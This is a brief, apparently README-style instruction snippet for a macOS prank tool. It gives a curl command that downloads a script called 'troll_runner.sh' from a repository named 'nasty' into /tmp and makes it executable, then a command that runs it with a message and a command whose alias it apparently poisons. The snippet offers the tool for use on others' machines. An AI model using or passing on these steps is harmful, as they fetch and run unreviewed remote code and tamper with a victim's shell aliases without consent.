Get the script firts

```
#OSX 
cd /tmp && curl -sLO "https://raw.githubusercontent.com/currupipi/nasty/master/troll_runner.sh" && chmod +x /tmp/troll_runner.sh
```

And run it

```
/tmp/troll_runner.sh "Some message here" <command2PosionAlias>
```
